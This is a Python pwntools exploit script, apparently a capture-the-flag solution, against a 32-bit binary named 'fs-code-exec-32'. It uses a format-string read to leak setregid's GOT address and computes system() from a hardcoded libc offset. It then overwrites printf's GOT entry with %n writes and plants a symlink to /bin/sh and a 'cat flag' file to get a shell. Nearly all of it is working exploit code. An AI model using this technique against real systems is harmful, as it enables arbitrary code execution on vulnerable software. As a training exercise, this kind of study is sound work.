from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Requires a complex symlink from wierd chars to /bin/sh
if os.path.exists("Welcome"):
    os.remove("Welcome")
os.symlink("//bin/sh", "Welcome")
if os.path.exists("%s!"):
    os.remove("%s!")
f = open("%s!", "w")
f.write("cat flag")
f.close()



# This was for 64 bit dummy
#system_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['system']
#setregid_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['setregid']
#offset = system_init_addr - setregid_init_addr
#print(offset)
offset = 673872 # From gdb.  setregid - system addresses

# Addresses needed for the attack
got_setregid_addr = 0x0804a034 # Address of the got entry
got_printf_addr = 0x0804a010 # Address of the got entry

read_inp = '%9$s\0\0\0\0\x34\xa0\x04\x08'

# Launch processs
p = process('./fs-code-exec-32', env=env)

print(p.recvline())
p.sendline(read_inp)
data = p.recvline()
print(data.split())
setregid_addr = u32(data.split()[1])
print(hex(setregid_addr))

system_addr = setregid_addr - offset
print(hex(system_addr))

low = system_addr % 0x10000
print(hex(low))

high = system_addr / 0x10000
print(hex(high))

print(low)
print(high)
diff = high - low
print(diff)

write_inp = '%' + str(low) + 'x%14$n%' + str(diff) + 'x%15$n\0\0\0\0\x10\xa0\x04\x08\x12\xa0\x04\x08'
#write_inp = '\x10\xa0\x04\x08\x12\xa0\x04\x08\0\0\0\0%' + str(low-8) + 'x%7$n%' + str(diff) + 'x%8$n'
print(len(write_inp))
print(write_inp)
print(p.recvline())
p.sendline(write_inp)

p.interactive()
